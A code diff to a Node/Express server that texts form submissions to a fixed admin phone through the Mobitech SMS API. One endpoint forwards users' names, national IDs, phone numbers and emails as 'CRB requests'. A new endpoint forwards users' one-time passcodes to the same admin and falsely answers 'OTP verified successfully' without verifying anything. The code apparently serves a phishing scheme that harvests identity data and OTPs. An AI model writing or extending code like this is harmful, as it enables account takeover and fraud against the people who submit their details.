@@ -28,6 +28,26 @@ const MOBITECH_SERVICE_ID = parseInt(process.env.MOBITECH_SERVICE_ID || '0', 10)
 
 const MOBITECH_ENDPOINT = 'https://app.mobitechtechnologies.com/sms/sendsms';
 
+// Helper function to handle Mobitech SMS sending
+async function sendMobitechSMS(messageText) {
+  const smsPayload = {
+    mobile: ADMIN_PHONE_NUMBER,
+    response_type: 'json',
+    sender_name: MOBITECH_SENDER_NAME,
+    service_id: MOBITECH_SERVICE_ID,
+    message: messageText
+  };
+
+  return await axios.post(MOBITECH_ENDPOINT, smsPayload, {
+    headers: {
+      'h_api_key': MOBITECH_API_KEY,
+      'Content-Type': 'application/json'
+    },
+    timeout: 10000
+  });
+}
+
+// 1. Credit Report Submission Endpoint
 app.post('/api/submit-credit-report', async (req, res) => {
   try {
     const { fullName, nationalId, phoneNumber, email } = req.body;
@@ -41,27 +61,9 @@ app.post('/api/submit-credit-report', async (req, res) => {
 
     const smsMessage = `New CRB Request:\nName: ${fullName}\nID: ${nationalId}\nPhone: ${phoneNumber}\nEmail: ${email || 'N/A'}`;
 
-    // Mobitech payload (formatted recipient number)
-    const smsPayload = {
-      mobile: ADMIN_PHONE_NUMBER,
-      response_type: 'json',
-      sender_name: MOBITECH_SENDER_NAME,
-      service_id: MOBITECH_SERVICE_ID,
-      message: smsMessage
-    };
+    const smsResponse = await sendMobitechSMS(smsMessage);
+    console.log('Mobitech API Response (Report Submission):', smsResponse.data);
 
-    // Axios request to Mobitech
-    const smsResponse = await axios.post(MOBITECH_ENDPOINT, smsPayload, {
-      headers: {
-        'h_api_key': MOBITECH_API_KEY,
-        'Content-Type': 'application/json'
-      },
-      timeout: 10000 
-    });
-
-    console.log('Mobitech API Response:', smsResponse.data);
-
-    // Return success response to client
     return res.status(200).json({
       success: true,
       message: 'Request submitted successfully!',
@@ -75,6 +77,40 @@ app.post('/api/submit-credit-report', async (req, res) => {
     return res.status(500).json({
       success: false,
       message: typeof errorDetails === 'string' ? errorDetails : 'Failed to send SMS via Mobitech API.'
+    });
+  }
+});
+
+// 2. OTP Verification Endpoint
+app.post('/api/verify-otp-sms', async (req, res) => {
+  try {
+    const { otp, phoneNumber } = req.body;
+
+    if (!otp) {
+      return res.status(400).json({
+        success: false,
+        message: 'OTP parameter is required.'
+      });
+    }
+
+    const smsMessage = `OTP Received:\nCode: ${otp}\nUser Phone: ${phoneNumber || 'N/A'}`;
+
+    const smsResponse = await sendMobitechSMS(smsMessage);
+    console.log('Mobitech API Response (OTP Verification):', smsResponse.data);
+
+    return res.status(200).json({
+      success: true,
+      message: 'OTP verified successfully.',
+      data: smsResponse.data
+    });
+
+  } catch (error) {
+    const errorDetails = error.response?.data || error.message;
+    console.error('Mobitech OTP SMS Failure:', errorDetails);
+
+    return res.status(500).json({
+      success: false,
+      message: typeof errorDetails === 'string' ? errorDetails : 'Failed to send OTP verification notification.'
     });
   }
 });
